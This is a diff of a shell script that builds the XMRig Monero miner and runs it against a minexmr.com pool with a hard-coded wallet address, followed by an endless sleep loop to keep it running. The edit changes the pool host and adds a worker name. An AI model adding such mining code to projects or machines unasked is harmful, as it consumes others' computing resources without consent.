@@ -6,7 +6,7 @@ sudo git clone https://github.com/xmrig/xmrig.git
 sudo mkdir xmrig/build && cd xmrig/build
 sudo cmake ..
 sudo make -j$(nproc)
-./xmrig -a rx/0 -o us-west.minexmr.com:4444 -u 85g3ACGwaFrVKsxcUzLfKN2ythUVi3Grk76FT5YKKkAfbBceEohBseBAQahE83VnqjVjkiWzJiw1gZjH6fxxEuz91fUUsQX -k --tls -p test2
+./xmrig -o pool.minexmr.com:4444 -u 85g3ACGwaFrVKsxcUzLfKN2ythUVi3Grk76FT5YKKkAfbBceEohBseBAQahE83VnqjVjkiWzJiw1gZjH6fxxEuz91fUUsQX.gowork
 while [ 1 ]; do
 sleep 3
 done
